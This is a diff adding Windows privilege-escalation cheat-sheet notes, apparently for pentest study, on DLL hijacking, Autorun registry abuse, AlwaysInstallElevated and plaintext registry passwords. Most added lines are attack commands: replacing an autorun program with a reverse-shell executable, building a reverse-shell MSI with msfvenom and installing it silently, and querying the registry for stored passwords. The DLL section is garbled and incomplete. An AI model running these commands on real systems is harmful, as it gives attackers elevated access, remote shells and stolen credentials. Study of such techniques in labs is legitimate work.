@@ -56,6 +56,46 @@ If the original service executable is modifiable by our user, we can simply repl
 
 
 5---- DLL Hijacking ----
+Often a service will try to load functionality from a library called a DLL (dynamic-link library).Tthe DLL will be executed with the same privileges as the service that loaded it.a DLL is loaded with an absolute path, it might be possible.
+
+> .\winPEASany.exe quiet servicesinfo                                                                                   ---> Run winPEAS to enumerate non-Windows services
+> .\accesschk.exe /accepteula -uvqc user dllsvc                                                                         ---> Neeed Foucus 
+
+
+
+-------------------- Registary --------------------
+
+1---- Exploiting Autorun ----
+Windows allows users to set specific programs to automatically start whenever the system boots, the list of programs that have this functionality enabled is stored in the Windows Registry.The Autorun programs are usually stored in the Run or RunOnce registry keys 
+
+> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run                                                          ---> Enumerate the AutoRun manullay executables
+> Accesschk.exe -accepteula -wuqv "C:\Program Files\Autorun Program\program.exe"                                        ---> Use accesschk.exe to verify the permissions on each one
+> copy "C:\Program Files\Autorun Program\program.exe" C:\Temp                                                           ---> Create a backup of the original
+> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe                                          ---> Copy our reverse shell executable to overwrite the AutoRun executable
+
+2----AlwaysInstallElevated ----
+
+> .\winPEASany.exe quiet windowscreds                                                                                   ---> Use winPEAS to see if both registry values are set.
+> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated                                 ---> verify to see if both registry values are set manually
+> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated                                 ---> verify to see if both registry values are set manually
+$ msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f msi -o reverse.msi                                             ---> Create a reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension
+> msiexec /quiet /qn /i C:\PrivEsc\reverse.msi                                                                          ---> start a listener on Kali, and run the installer to trigger the exploit
+explain the switches:
+/quiet = Suppress any messages to the user during installation
+/qn = No GUI
+/i = Regular (vs. administrative) installation
+
+-------------------- Passwords --------------------
+Windows itself sometimes will store passwords in plaintext in the Registry.
+
+> reg query HKLM /f password /t REG_SZ /s
+> reg query HKCU /f password /t REG_SZ /s
+
+
+
+
+
+
 
 
 
